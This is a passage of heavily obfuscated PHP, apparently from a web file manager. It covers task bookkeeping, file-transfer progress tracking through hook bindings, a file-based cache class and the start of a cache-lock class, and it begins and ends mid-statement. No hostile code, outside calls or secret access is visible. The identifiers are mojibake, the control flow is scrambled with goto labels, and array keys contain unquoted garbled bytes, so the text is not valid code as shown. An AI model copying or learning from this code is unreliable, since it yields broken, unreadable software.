$dê–Æ„Ã÷ñ) { goto FßµÕ½º„; eçÉÇ¹ÆÉª: $D’áÌ“‘™[$EĞ§½Ï­Õù[714]] = $dê–Æ„Ã÷ñ; self::valueSet($cğœĞ²Îë˜, $D’áÌ“‘™); self::log($EĞ§½Ï­Õù[1482] . $D’áÌ“‘™[$EĞ§½Ï­Õù[391]] . $EĞ§½Ï­Õù[1483] . $dê–Æ„Ã÷ñ); goto C…­…çõ“; C…­…çõ“: return !0; goto AŒ¥²ì·ĞŒ; FßµÕ½º„: $EĞ§½Ï­Õù =& $_SERVER[±á õÁ]; $D’áÌ“‘™ = self::valueGet($cğœĞ²Îë˜); if (!$D’áÌ“‘™) { return !1; } goto eçÉÇ¹ÆÉª; AŒ¥²ì·ĞŒ: } public static function valueGet($cÊµ„ĞŞÉö = false) { $açˆÃ¨ˆ¶‡ =& $_SERVER[±á õÁ]; if ($cÊµ„ĞŞÉö) { $e Âø±´¸ = Model($açˆÃ¨ˆ¶‡[423])->where(array($açˆÃ¨ˆ¶‡[99] => $cÊµ„ĞŞÉö, $açˆÃ¨ˆ¶‡[39] => $açˆÃ¨ˆ¶‡[1484]))->find(); return $e Âø±´¸ ? json_decode($e Âø±´¸[$açˆÃ¨ˆ¶‡[375]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($f¤î¹Ğ¡¦è = false) { goto dŠĞòÍó¹™; Eº‚ÁºáÖ : $AÙŞÑĞ†Ù = Model($aªÂ§ÍİµÁ[423])->where($bøø´¾¨£‘)->select(); $AÙŞÑĞ†Ù = $AÙŞÑĞ†Ù ? $AÙŞÑĞ†Ù : array(); foreach ($AÙŞÑĞ†Ù as $CÌØÌ¯‰ => $EÔ·„¥ß²Í) { $AÙŞÑĞ†Ù[$CÌØÌ¯‰] = json_decode($EÔ·„¥ß²Í[$aªÂ§ÍİµÁ[375]], !0); } goto EÍ‹—ªÒÈÕ; EÍ‹—ªÒÈÕ: return $AÙŞÑĞ†Ù; goto AÃÓè¡æÇ; dŠĞòÍó¹™: $aªÂ§ÍİµÁ =& $_SERVER[±á õÁ]; $bøø´¾¨£‘ = array($aªÂ§ÍİµÁ[39] => $aªÂ§ÍİµÁ[1484]); if ($f¤î¹Ğ¡¦è) { $bøø´¾¨£‘[$aªÂ§ÍİµÁ[1463]] = $f¤î¹Ğ¡¦è; } goto Eº‚ÁºáÖ ; AÃÓè¡æÇ: } public static function valueSet($BËÌµø¡¿Û, $eÀÓë˜àª˜) { goto d†Œó¸’Â; d†Œó¸’Â: $AáùŠ¤ˆ¯Æ =& $_SERVER[±á õÁ]; if (!$eÀÓë˜àª˜) { return Model($AáùŠ¤ˆ¯Æ[423])->where(array($AáùŠ¤ˆ¯Æ[99] => $BËÌµø¡¿Û, $AáùŠ¤ˆ¯Æ[39] => $AáùŠ¤ˆ¯Æ[1484]))->delete(); } $dæŠÎ¬õ•Í = json_encode($eÀÓë˜àª˜); goto d¡§©ŠÒŞË; F¬…¾£Ñ‹Œ: Model($AáùŠ¤ˆ¯Æ[423])->add($aİ–ßßŠä, array(), !0); goto bêù‡Ô “Â; d¡§©ŠÒŞË: if (!$dæŠÎ¬õ•Í) { ob_start(); var_dump($eÀÓë˜àª˜); $fšÇ¹…øÙ = ob_get_clean(); self::log($AáùŠ¤ˆ¯Æ[1485] . json_encode_force($fšÇ¹…øÙ)); } if (!$BËÌµø¡¿Û || !$eÀÓë˜àª˜[$AáùŠ¤ˆ¯Æ[391]]) { return !1; } $aİ–ßßŠä = array($AáùŠ¤ˆ¯Æ[39] => $AáùŠ¤ˆ¯Æ[1484], $AáùŠ¤ˆ¯Æ[1463] => USER_ID, $AáùŠ¤ˆ¯Æ[99] => $BËÌµø¡¿Û, $AáùŠ¤ˆ¯Æ[375] => $dæŠÎ¬õ•Í); goto F¬…¾£Ñ‹Œ; bêù‡Ô “Â: } public static function log($CŠÏ¨¬Ş…œ) { write_log($CŠÏ¨¬Ş…œ, $_SERVER[±á õÁ][1486]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto FÚÂôÌ´«Ğ; c«šãÙ¼ñ: Hook::bind($dÔô¸îò«›[1487], array($this, $dÔô¸îò«›[1488])); Hook::bind($dÔô¸îò«›[1489], array($this, $dÔô¸îò«›[1490])); Hook::bind($dÔô¸îò«›[1491], array($this, $dÔô¸îò«›[1492])); goto AìéŒå‹Ë; A—ôèŒ÷Î„: $Dã„ÔíÁÍ¾[$dÔô¸îò«›[1506]] = LNG($dÔô¸îò«›[1507]); $Dã„ÔíÁÍ¾[$dÔô¸îò«›[1508]] = 0; $Dã„ÔíÁÍ¾[$dÔô¸îò«›[1509]] = 0; goto A ‚å¯Æ‡ ; a»›¶ğ«››: Hook::bind($dÔô¸îò«›[536], array($this, $dÔô¸îò«›[1496])); Hook::bind($dÔô¸îò«›[538], array($this, $dÔô¸îò«›[1496])); Hook::bind($dÔô¸îò«›[540], array($this, $dÔô¸îò«›[1496])); goto f„¾Á°†ĞÜ; f„¾Á°†ĞÜ: Hook::bind($dÔô¸îò«›[1497], array($this, $dÔô¸îò«›[1498])); Hook::bind($dÔô¸îò«›[556], array($this, $dÔô¸îò«›[1499])); $this->sourceModelCopyFlag = !1; goto f¤Äîé¥ø›; AìéŒå‹Ë: Hook::bind($dÔô¸îò«›[563], array($this, $dÔô¸îò«›[1493])); Hook::bind($dÔô¸îò«›[564], array($this, $dÔô¸îò«›[1494])); Hook::bind($dÔô¸îò«›[566], array($this, $dÔô¸îò«›[1495])); goto CÈÊé¸Ó¥³; FÚÂôÌ´«Ğ: $dÔô¸îò«› =& $_SERVER[±á õÁ]; $Dã„ÔíÁÍ¾ =& $this->task; $this->sourceCopyFolder = !1; goto c«šãÙ¼ñ; f¤Äîé¥ø›: Hook::bind($dÔô¸îò«›[1500], array($this, $dÔô¸îò«›[1501])); Hook::bind($dÔô¸îò«›[1502], array($this, $dÔô¸îò«›[1503])); Hook::bind($dÔô¸îò«›[1504], array($this, $dÔô¸îò«›[1505])); goto A—ôèŒ÷Î„; CÈÊé¸Ó¥³: Hook::bind($dÔô¸îò«›[567], array($this, $dÔô¸îò«›[1495])); Hook::bind($dÔô¸îò«›[534], array($this, $dÔô¸îò«›[1496])); Hook::bind($dÔô¸îò«›[531], array($this, $dÔô¸îò«›[1496])); goto a»›¶ğ«››; A ‚å¯Æ‡ : $Dã„ÔíÁÍ¾[$dÔô¸îò«›[996]] = $dÔô¸îò«›[43]; $Dã„ÔíÁÍ¾[$dÔô¸îò«›[1510]] = $dÔô¸îò«›[43]; $Dã„ÔíÁÍ¾[$dÔô¸îò«›[1511]] = 0; goto A´‘±½œ’…; A´‘±½œ’…: $Dã„ÔíÁÍ¾[$dÔô¸îò«›[1512]] = 0; $Dã„ÔíÁÍ¾[$dÔô¸îò«›[1513]] = 0; if (!$Dã„ÔíÁÍ¾[$dÔô¸îò«›[1366]]) { $Dã„ÔíÁÍ¾[$dÔô¸îò«›[1366]] = LNG($dÔô¸îò«›[1514]); } goto E Ã‰ìÎÈ; E Ã‰ìÎÈ: } protected function endAfter() { goto A²ÊéÇÑ•; FÏ¸Ï¢Ì“: Hook::unbind($cÎ—ó‡Ş[1500], array($this, $cÎ—ó‡Ş[1501])); Hook::unbind($cÎ—ó‡Ş[1502], array($this, $cÎ—ó‡Ş[1503])); Hook::unbind($cÎ—ó‡Ş[1504], array($this, $cÎ—ó‡Ş[1505])); goto EÄš°ö´È; A²ÊéÇÑ•: $cÎ—ó‡Ş =& $_SERVER[±á õÁ]; Hook::unbind($cÎ—ó‡Ş[1487], array($this, $cÎ—ó‡Ş[1488])); Hook::unbind($cÎ—ó‡Ş[1489], array($this, $cÎ—ó‡Ş[1490])); goto b‡®èæ©ò°; b‡®èæ©ò°: Hook::unbind($cÎ—ó‡Ş[1491], array($this, $cÎ—ó‡Ş[1492])); Hook::unbind($cÎ—ó‡Ş[563], array($this, $cÎ—ó‡Ş[1493])); Hook::unbind($cÎ—ó‡Ş[564], array($this, $cÎ—ó‡Ş[1494])); goto a…º†˜ğÖï; B¼½œ‰’ÔÓ: Hook::unbind($cÎ—ó‡Ş[540], array($this, $cÎ—ó‡Ş[1496])); Hook::unbind($cÎ—ó‡Ş[1497], array($this, $cÎ—ó‡Ş[1498])); Hook::unbind($cÎ—ó‡Ş[556], array($this, $cÎ—ó‡Ş[1499])); goto FÏ¸Ï¢Ì“; a…º†˜ğÖï: Hook::unbind($cÎ—ó‡Ş[566], array($this, $cÎ—ó‡Ş[1495])); Hook::unbind($cÎ—ó‡Ş[567], array($this, $cÎ—ó‡Ş[1495])); Hook::unbind($cÎ—ó‡Ş[534], array($this, $cÎ—ó‡Ş[1496])); goto DğÀÂŠö; DğÀÂŠö: Hook::unbind($cÎ—ó‡Ş[531], array($this, $cÎ—ó‡Ş[1496])); Hook::unbind($cÎ—ó‡Ş[536], array($this, $cÎ—ó‡Ş[1496])); Hook::unbind($cÎ—ó‡Ş[538], array($this, $cÎ—ó‡Ş[1496])); goto B¼½œ‰’ÔÓ; EÄš°ö´È: } public function copyMoveStart($BÕù˜¥¾Í‹, $e•‰ÉÅè†, $FŒ¾ÅÊ‘¾, $b‡ãˆ´›) { goto a‹ÇôŒ‰Ä–; A¨øâ¦à·—: if (substr($e•‰ÉÅè†, 0, strlen($bŠŠÑÌÕ¡)) == $bŠŠÑÌÕ¡) { return; } if (substr($b‡ãˆ´›, 0, strlen($bŠŠÑÌÕ¡)) == $bŠŠÑÌÕ¡) { return; } $FĞî¼©· =& $this->task; goto càå±ì’°ù; a‹ÇôŒ‰Ä–: $eßî²ƒĞ¦ğ =& $_SERVER[±á õÁ]; self::log($eßî²ƒĞ¦ğ[1515] . $e•‰ÉÅè† . $eßî²ƒĞ¦ğ[76] . $b‡ãˆ´›); $bŠŠÑÌÕ¡ = rtrim(TEMP_FILES, $eßî²ƒĞ¦ğ[8]); goto A¨øâ¦à·—; càå±ì’°ù: $FĞî¼©·[$eßî²ƒĞ¦ğ[1516]] = KodIO::transferType($BÕù˜¥¾Í‹, $FŒ¾ÅÊ‘¾); $this->update(); goto CËßÇ›åÓ; CËßÇ›åÓ: } public function updateAfter() { goto Aâ›âÁŠÜ; b„ÔëŸÉê¡: if ($this->sourceModelCopyFlag) { return; } if ($dô»ã¼ôê‚[$A«ªŠÙŒŒ[1516]] == $A«ªŠÙŒŒ[1115]) { return; } if ($dô»ã¼ôê‚[$A«ªŠÙŒŒ[1516]] == $A«ªŠÙŒŒ[1062] || $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1516]] == $A«ªŠÙŒŒ[113]) { if ($dô»ã¼ôê‚[$A«ªŠÙŒŒ[1510]]) { $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1513]] = $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1512]] + $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1509]]; } } else { if ($dô»ã¼ôê‚[$A«ªŠÙŒŒ[1516]] == $A«ªŠÙŒŒ[1116]) { if ($dô»ã¼ôê‚[$A«ªŠÙŒŒ[1510]] == $A«ªŠÙŒŒ[1062]) { $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1513]] = $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1512]] + $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1509]] * 0.5; } else { if ($dô»ã¼ôê‚[$A«ªŠÙŒŒ[1510]] == $A«ªŠÙŒŒ[113]) { $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1513]] = $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1512]] + $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1508]] * 0.5 + $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1509]] * 0.5; } } } } goto E¦¿µˆ“ô; E¦¿µˆ“ô: $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1464]] = $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1513]] / $dô»ã¼ôê‚[$A«ªŠÙŒŒ[723]]; if ($dô»ã¼ôê‚[$A«ªŠÙŒŒ[1464]] > 0) { $c‹Êò²±ëœ = timeFloat() - $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1466]] - $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1469]]; $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1470]] = $c‹Êò²±ëœ * (1 - $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1464]]) / $dô»ã¼ôê‚[$A«ªŠÙŒŒ[1464]]; } goto B¼Òí®¨¡›; Aâ›âÁŠÜ: $A«ªŠÙŒŒ =& $_SERVER[±á õÁ]; $dô»ã¼ôê‚ =& $this->task; if (!$dô»ã¼ôê‚[$A«ªŠÙŒŒ[723]]) { return; } goto b„ÔëŸÉê¡; B¼Òí®¨¡›: } public function addPath($bì³Àçß¼) { goto FÔºÇŠ®Õƒ; cöİË’ÓÌÕ: $E„£Õ²Èß‹ = IO::infoWithChildren($bì³Àçß¼); $EªÔ†Ì„ = $A”ÓÁÏ ¢[$b‘óâÂà‰“[1517]] ? $A”ÓÁÏ ¢[$b‘óâÂà‰“[1517]][$b‘óâÂà‰“[1518]] : 0; $A”ÓÁÏ ¢[$b‘óâÂà‰“[1517]] = array($b‘óâÂà‰“[1518] => $EªÔ†Ì„ + 1, $b‘óâÂà‰“[410] => $E„£Õ²Èß‹[$b‘óâÂà‰“[38]], $b‘óâÂà‰“[85] => $E„£Õ²Èß‹[$b‘óâÂà‰“[85]], $b‘óâÂà‰“[491] => $E„£Õ²Èß‹[$b‘óâÂà‰“[491]] ? $E„£Õ²Èß‹[$b‘óâÂà‰“[491]] : $E„£Õ²Èß‹[$b‘óâÂà‰“[85]]); goto B·Î›‚¥Ö; FÔºÇŠ®Õƒ: $b‘óâÂà‰“ =& $_SERVER[±á õÁ]; if (!$bì³Àçß¼) { return; } $A”ÓÁÏ ¢ =& $this->task; goto cöİË’ÓÌÕ; B·Î›‚¥Ö: if ($E„£Õ²Èß‹[$b‘óâÂà‰“[39]] == $b‘óâÂà‰“[181]) { $A”ÓÁÏ ¢[$b‘óâÂà‰“[994]] += 1; } else { $A”ÓÁÏ ¢[$b‘óâÂà‰“[994]] += $E„£Õ²Èß‹[$b‘óâÂà‰“[90]][$b‘óâÂà‰“[88]]; if ($E„£Õ²Èß‹[$b‘óâÂà‰“[393]]) { $A”ÓÁÏ ¢[$b‘óâÂà‰“[994]] += $E„£Õ²Èß‹[$b‘óâÂà‰“[90]][$b‘óâÂà‰“[89]] + 1; } } $A”ÓÁÏ ¢[$b‘óâÂà‰“[723]] += $E„£Õ²Èß‹[$b‘óâÂà‰“[87]]; $this->update(); goto E¥Œã¤ğĞÌ; E¥Œã¤ğĞÌ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($AòÂÑå¬„™) { $CËô—…Â…é =& $_SERVER[±á õÁ]; $f÷—Üê¹Òô =& $this->task; $f÷—Üê¹Òô[$CËô—…Â…é[1506]] = $AòÂÑå¬„™[$CËô—…Â…é[38]]; $f÷—Üê¹Òô[$CËô—…Â…é[996]] = $AòÂÑå¬„™[$CËô—…Â…é[38]]; $this->update(); } public function copyFileStart($DÉ™œ¦µè, $a¹ê±ÃåÂ, $EæÅ•©ïİ”, $aÔŸİç¥Ù, $CÊµä¹ğª, $d¹¯õïî‚´) { goto Dß®°é„’½; cõÍõù•–¬: $this->update(); goto CÆ¥ˆƒ…Óé; Dß®°é„’½: $c²ÓÖÃ¨é‘ =& $_SERVER[±á õÁ]; $f»¤ê£õˆŠ = $CÊµä¹ğª; if ($f»¤ê£õˆŠ == $GLOBALS[$c²ÓÖÃ¨é‘[1519]]) { $f»¤ê£õˆŠ = $GLOBALS[$c²ÓÖÃ¨é‘[1520]]; } goto C–¢¯™öÆô; Dä°ö™®Á°: $CÜ¦·­ƒˆÒ[$c²ÓÖÃ¨é‘[1506]] = $f»¤ê£õˆŠ; $CÜ¦·­ƒˆÒ[$c²ÓÖÃ¨é‘[1508]] = (int) $DÉ™œ¦µè->size($a¹ê±ÃåÂ); $CÜ¦·­ƒˆÒ[$c²ÓÖÃ¨é‘[1509]] = 0; goto BÏÚêÄİ¥æ; BÏÚêÄİ¥æ: $CÜ¦·­ƒˆÒ[$c²ÓÖÃ¨é‘[996]] = $c²ÓÖÃ¨é‘[43]; $CÜ¦·­ƒˆÒ[$c²ÓÖÃ¨é‘[1510]] = $c²ÓÖÃ¨é‘[43]; $CÜ¦·­ƒˆÒ[$c²ÓÖÃ¨é‘[1511]] = 0; goto cõÍõù•–¬; C–¢¯™öÆô: $GLOBALS[$c²ÓÖÃ¨é‘[1520]] = $CÊµä¹ğª; $GLOBALS[$c²ÓÖÃ¨é‘[1519]] = $d¹¯õïî‚´; $CÜ¦·­ƒˆÒ =& $this->task; goto Dä°ö™®Á°; CÆ¥ˆƒ…Óé: } public function copyFileEnd($E½óÑ”¢Ñ˜, $eğéå¥¨•, $AÌ•ìÑ½çì, $AÆÖÒ½æ£, $CéÁÈ˜‹–«, $Fºùª²†±™) { $b¸â•Ğ™ =& $_SERVER[±á õÁ]; $bÁµæ´Í˜ =& $this->task; $bÁµæ´Í˜[$b¸â•Ğ™[1509]] = $bÁµæ´Í˜[$b¸â•Ğ™[1508]]; $bÁµæ´Í˜[$b¸â•Ğ™[1510]] = $b¸â•Ğ™[43]; if ($CéÁÈ˜‹–« == $bÁµæ´Í˜[$b¸â•Ğ™[1506]]) { $bÁµæ´Í˜[$b¸â•Ğ™[1512]] += $bÁµæ´Í˜[$b¸â•Ğ™[1508]]; $bÁµæ´Í˜[$b¸â•Ğ™[1513]] = $bÁµæ´Í˜[$b¸â•Ğ™[1512]]; $this->update(1); } else { $this->update(); $bÁµæ´Í˜[$b¸â•Ğ™[1509]] = 0; } self::log($b¸â•Ğ™[1521] . $eğéå¥¨• . $b¸â•Ğ™[76] . $AÆÖÒ½æ£ . $b¸â•Ğ™[14] . $CéÁÈ˜‹–« . $b¸â•Ğ™[1522] . $bÁµæ´Í˜[$b¸â•Ğ™[1506]]); } public function updateFileEnd($D„‚ßå¥Œ, $cëª™§­‚Ç) { goto bœ«™«ƒù¢; F¬õõĞö¦: $DØŒ’¹ÅâÛ[$A•¡Ò¶öòŞ[1508]] = $cëª™§­‚Ç; $DØŒ’¹ÅâÛ[$A•¡Ò¶öòŞ[1512]] += $cëª™§­‚Ç; $DØŒ’¹ÅâÛ[$A•¡Ò¶öòŞ[1513]] = $DØŒ’¹ÅâÛ[$A•¡Ò¶öòŞ[1512]]; goto cõâÛˆƒœ¯; bœ«™«ƒù¢: $A•¡Ò¶öòŞ =& $_SERVER[±á õÁ]; $DØŒ’¹ÅâÛ =& $this->task; $DØŒ’¹ÅâÛ[$A•¡Ò¶öòŞ[1506]] = $D„‚ßå¥Œ; goto F¬õõĞö¦; cõâÛˆƒœ¯: $this->update(1); self::log($A•¡Ò¶öòŞ[1523] . $D„‚ßå¥Œ); goto c§³íÙÉì; c§³íÙÉì: } public function sourceModelCopy($D‰Î‰¬¡ÎŠ) { goto D‹ìŒ‹Ö–¡; a‘ÓÎ¬Ş†Ã: switch ($F×ÏŸ½¦­§) { case $DÊ¸÷­ÚàŒ[532]: $dÑ™«´©Ù³ = 1; break; case $DÊ¸÷­ÚàŒ[535]: $Dù°ßÆùÖŠ[$DÊ¸÷­ÚàŒ[1506]] = $eè…ƒìÃö­[$DÊ¸÷­ÚàŒ[38]]; break; case $DÊ¸÷­ÚàŒ[537]: $dÑ™«´©Ù³ = intval($D‰Î‰¬¡ÎŠ[$DÊ¸÷­ÚàŒ[378]] * 0.4); break; case $DÊ¸÷­ÚàŒ[539]: $dÑ™«´©Ù³ = intval($D‰Î‰¬¡ÎŠ[$DÊ¸÷­ÚàŒ[378]] * 0.2); break; case $DÊ¸÷­ÚàŒ[541]: $dÑ™«´©Ù³ = intval($D‰Î‰¬¡ÎŠ[$DÊ¸÷­ÚàŒ[378]] * 0.4); break; } $this->update($dÑ™«´©Ù³); $this->sourceModelCopyFlag = !1; goto f¾Ÿ ß“óÛ; D‹ìŒ‹Ö–¡: $DÊ¸÷­ÚàŒ =& $_SERVER[±á õÁ]; $F×ÏŸ½¦­§ = $D‰Î‰¬¡ÎŠ[0]; $eè…ƒìÃö­ = $D‰Î‰¬¡ÎŠ[1]; goto Cšà¼ó‡„²; Cšà¼ó‡„²: $Dù°ßÆùÖŠ =& $this->task; $this->sourceModelCopyFlag = !0; $dÑ™«´©Ù³ = 0; goto a‘ÓÎ¬Ş†Ã; f¾Ÿ ß“óÛ: } public function sourceRemove($d‹¶ŠĞ¯Ù, $b¼èèéÓ…á) { $aÃ–ÃòÁÉÑ =& $_SERVER[±á õÁ]; $this->sourceModelCopyFlag = !0; $F…†ÌÅ¼ŞÒ = 1; if (isset($d‹¶ŠĞ¯Ù[$aÃ–ÃòÁÉÑ[90]])) { $F…†ÌÅ¼ŞÒ = $d‹¶ŠĞ¯Ù[$aÃ–ÃòÁÉÑ[90]][$aÃ–ÃòÁÉÑ[88]] + $d‹¶ŠĞ¯Ù[$aÃ–ÃòÁÉÑ[90]][$aÃ–ÃòÁÉÑ[89]] + 1; } $this->update($F…†ÌÅ¼ŞÒ); $this->sourceModelCopyFlag = !1; } public function sourceMove($f©ƒ¯ßäë) { $this->sourceRemove($f©ƒ¯ßäë, !1); } public function curlProgress($CÇ†ö˜Ì¤…, $f÷Ù†Ú²Õ, $FĞËÎôåÙç, $bå›¬”¯“—, $D¡… Ãï—©) { $fÕàŒİÔõ‚ =& $_SERVER[±á õÁ]; $fÉñ«•ï­Á =& $this->task; if ($D¡… Ãï—© > 0) { $fÉñ«•ï­Á[$fÕàŒİÔõ‚[996]] = $fÕàŒİÔõ‚[1524]; $fÉñ«•ï­Á[$fÕàŒİÔõ‚[1510]] = $fÕàŒİÔõ‚[113]; if ($fÉñ«•ï­Á[$fÕàŒİÔõ‚[1508]] == $bå›¬”¯“— || $bå›¬”¯“— > 1024 * 1024) { $fÉñ«•ï­Á[$fÕàŒİÔõ‚[1509]] = $D¡… Ãï—©; } if ($fÉñ«•ï­Á[$fÕàŒİÔõ‚[1511]]) { $fÉñ«•ï­Á[$fÕàŒİÔõ‚[1509]] = $D¡… Ãï—© + $fÉñ«•ï­Á[$fÕàŒİÔõ‚[1511]]; } } else { if ($FĞËÎôåÙç > 0) { if ($fÉñ«•ï­Á[$fÕàŒİÔõ‚[1508]] == $f÷Ù†Ú²Õ) { $fÉñ«•ï­Á[$fÕàŒİÔõ‚[1509]] = $FĞËÎôåÙç; $fÉñ«•ï­Á[$fÕàŒİÔõ‚[996]] = $fÕàŒİÔõ‚[1525]; $fÉñ«•ï­Á[$fÕàŒİÔõ‚[1510]] = $fÕàŒİÔõ‚[1062]; } } } $this->update(); } public function curlProgressStart($dƒ—ÏáŠ´ù) { } public function curlProgressEnd($fœÙÄÃÒ¼) { $B¨İµæ¯ğ =& $_SERVER[±á õÁ]; $c ¤„©……ã =& $this->task; $cäù¸·ââ‹ = curl_getinfo($fœÙÄÃÒ¼); $cºÄó×åÄ = $cäù¸·ââ‹[$B¨İµæ¯ğ[1526]]; if ($c ¤„©……ã[$B¨İµæ¯ğ[1510]] == $B¨İµæ¯ğ[113] && $cºÄó×åÄ) { $c ¤„©……ã[$B¨İµæ¯ğ[1511]] += $cºÄó×åÄ; } $this->update(); } } goto E‰…¤ƒ¤›; d¨óó„¯é¤: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($e‘åÁöÏÓ, $BÏ„Ä¯ß°) { $b“Ìß´ÔŸ× =& $_SERVER[±á õÁ]; $this->cachePath = $e‘åÁöÏÓ[$b“Ìß´ÔŸ×[85]]; $this->prefix = $b“Ìß´ÔŸ×[785]; $this->cacheTime = $BÏ„Ä¯ß°; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($bœ ˜Ì’¯È) { $cšÊ ¾ºîÔ =& $_SERVER[±á õÁ]; $bœ ˜Ì’¯È = str_replace(array($cšÊ ¾ºîÔ[786], $cšÊ ¾ºîÔ[103], $cšÊ ¾ºîÔ[79]), $cšÊ ¾ºîÔ[787], $bœ ˜Ì’¯È); return $this->cachePath . $cšÊ ¾ºîÔ[788] . $bœ ˜Ì’¯È . $cšÊ ¾ºîÔ[789]; } public function set($AË•éô­¿›, $FÉàèï£ï£, $E›‘ÅÑóĞø = false) { $B±ÔÑÖ  = $this->getFile($AË•éô­¿›); if (file_put_contents($B±ÔÑÖ , $this->prefix . $FÉàèï£ï£, LOCK_EX)) { return !0; } @unlink($B±ÔÑÖ ); return !1; } public function get($E…¤Àíò‡Š) { $AÊ´¥¬”ï = $this->getFile($E…¤Àíò‡Š); if (file_exists($AÊ´¥¬”ï) && filemtime($AÊ´¥¬”ï) < time() - $this->cacheTime) { @unlink($AÊ´¥¬”ï); return !1; } $bİ½³†•Òí = @file_get_contents($AÊ´¥¬”ï); return substr($bİ½³†•Òí, strlen($this->prefix)); } public function remove($eäÂ…õÉ‡¤) { $B¿İ¹ãÊÒ² = $this->getFile($eäÂ…õÉ‡¤); return @unlink($B¿İ¹ãÊÒ²); } public function deleteAll() { $F˜µšùˆ =& $_SERVER[±á õÁ]; $DŒÅòæå©Õ = scandir($this->cachePath); foreach ($DŒÅòæå©Õ as $F¨¿‹ØàÏ±) { $EÜèëì¤Ş = $this->cachePath . $F¨¿‹ØàÏ±; if (strpos($EÜèëì¤Ş, $F˜µšùˆ[789]) && strpos($EÜèëì¤Ş, $F˜µšùˆ[790])) { @unlink($EÜèëì¤Ş); } } } public function clearTimeout() { $FÄˆåà½Ÿ =& $_SERVER[±á õÁ]; $fÖÄÕ·‹Ø = scandir($this->cachePath); foreach ($fÖÄÕ·‹Ø as $Fá»ß›ö) { $a’¨†ƒ« = $this->cachePath . $Fá»ß›ö; if (strpos($a’¨†ƒ«, $FÄˆåà½Ÿ[789]) && strpos($a’¨†ƒ«, $FÄˆåà½Ÿ[790]) && filemtime($a’¨†ƒ«) < time() - $this->cacheTime) { @unlink($a’¨†ƒ«); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto Báë§®Å—î; Báë§®Å—î: $d·³¯§ÍÒ‹ =& $_SERVER[±á õÁ]; if (self::$handle) { return self::$handle; } $d²»ÁË = $GLOBALS[$d·³¯§ÍÒ‹[6]][$d·³¯§ÍÒ‹[352]]; goto f£¯Éˆ‰Ù; cËÄùµÛ³: if ($d×Œö²“ùÇ == $d·³¯§ÍÒ‹[27] && $fÉîö¶ì©‹ == $d·³¯§ÍÒ‹[19]) { $d×Œö²“ùÇ = $d·³¯§ÍÒ‹[181]; } switch ($d×Œö²“ùÇ) { case $d·³¯§ÍÒ‹[781]: self::$handle = new CacheLockRedis(); break; case $d·³¯§ÍÒ‹[782]: self::$handle = new CacheLockMemcached(); break; case $d·³¯§ÍÒ‹[27]: self::$handle = new CacheLockDatabase(); break; case $d·³¯§ÍÒ‹[181]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto eØ“Ú³; f£¯Éˆ‰Ù: self::$timeout = $d²»ÁË[$d·³¯§ÍÒ‹[791]] ? $d²»ÁË[$d·³¯§ÍÒ‹[791]] : 10; $fÉîö¶ì©‹ = _get($GLOBALS[$d·³¯§ÍÒ‹[6]], $d·³¯§ÍÒ‹[792]); $d×Œö²“ùÇ = $d²»ÁË[$d·³¯§ÍÒ‹[778]] ? $d²»ÁË[$d·³¯§ÍÒ‹[778]] : $d·³¯§ÍÒ‹[181]; goto cËÄùµÛ³; eØ“Ú³: } private static function key($DÀ°ê»Œ) { return $_SERVER[±á õÁ][793] . Cache::key($DÀ°ê»Œ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($AÎ®¦¡äå = '') { self::$errorMsg = $AÎ®¦¡äå; } public static function lockGlobal($A–‰òŸÉ­÷, $b›ôÜÖÏÛ‡) { return self::lock($A–‰òŸÉ­÷, $b›ôÜÖÏÛ‡, !0); } public static function lock($CçÇ³ƒ–„×, $Eô¿òÔ = false, $eì¬ã×‰ƒš = false) { goto f©È‘ÙÈÙ°; bÂ†äŠİ×ë: if (!$eì¬ã×‰ƒš) { self::$lockItem[$A£Ş½ªÕÛ] = !0; } return $c¯·¡›Ó»«; goto a¶“ÜÚ¯Õ; f©È‘ÙÈÙ°: $B£ñ¯’íÕ =& $_SERVER[±á õÁ]; $Bæ¯ŒÙºŠë = self::init(); $A£Ş½ªÕÛ = self::key($CçÇ³ƒ–„×); goto EÏÕÂêÊ¦’; EÏÕÂêÊ¦’: $Eô¿òÔ = $Eô¿òÔ ? $Eô¿òÔ : self::$timeout; $c¯·¡›Ó»« = $Bæ¯ŒÙºŠë->lock($A£Ş½ªÕÛ, $Eô¿òÔ); if (!$c¯·¡›Ó»«) { $aÑ”˜¹ô° = $B£ñ¯’íÕ[794] . $Eô¿òÔ . $B£ñ¯’íÕ[77] . self::$errorMsg . $B£ñ¯’íÕ[77] . get_caller_msg(); $cŞè½Ê›æ = "\114\x6f\143\x6b\40\141\x63\164\151\157\x6e\x3a\x20{$A£Ş½ªÕÛ}\40\164\151\x6d\x65\x6f\165\164\54\x6f\x76\x65\162\x20{$Eô¿òÔ}\x20\163"; if (is_string(self::$errorMsg) && self::$errorMsg) { $cŞè½Ê›æ = self::$errorMsg; } write_log($aÑ”˜¹ô°, $B£ñ¯’íÕ[795]); show_json($cŞè½Ê›æ, !1); } goto bÂ†äŠİ×ë; a¶“ÜÚ¯Õ: } public static function lockGet($a‹ÆŠˆºÉ•) { $béÖÔÊˆ¿š = self::key($a‹ÆŠˆºÉ•); if 